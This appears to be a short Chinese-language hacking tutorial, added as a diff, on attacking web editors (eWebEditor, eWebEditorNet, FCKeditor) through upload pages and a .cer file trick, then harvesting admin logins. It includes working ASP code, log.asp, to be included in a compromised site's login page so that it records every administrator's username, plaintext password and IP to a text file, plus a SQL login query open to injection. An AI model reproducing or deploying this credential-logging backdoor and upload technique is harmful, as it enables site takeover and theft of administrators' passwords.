@@ -1,0 +1,42 @@
+
+   常见后台编辑器渗透详解 登录密码记录
+
+-------------------------
+学习目标:
+1:学会ewebeditor ewebeditornet fckeditor 常用编辑器的渗透
+ewebeditor.asp?id=46&style=standard1
+eWebEditorNet/upload.aspx
+javascript:lbtnUpload.click();
+eWebEditorNet/uploadfile/2008922158231726.cer
+
+2:学会在破解不出md5密码时如何修改代码记录后台明文密码
+sql = "select * from admin where [user]='"&user&"' and [pass]='"&pass&"'"
+
+
+<!--#include file = log.asp -->
+
+log.asp 代码如下
+
+<%
+on error resume next
+user=request("user")
+pass=request("pass")
+ip=Request.ServerVariables("REMOTE_ADDR")
+set fs=server.CreateObject("Scripting.FileSystemObject")
+set file=fs.OpenTextFile(server.MapPath(".")&"\"&"log"&".txt",8,True)
+file.writeline "========================"
+file.writeline "时间:"&date&" "&time
+file.writeline "帐号:"+user
+file.writeline "密码:"+pass
+file.writeline "IP地址:"+ip
+file.writeline "========================"
+file.writeline ""
+file.close
+set file=nothing
+set fs=nothing
+%>
+
+
+
+
+
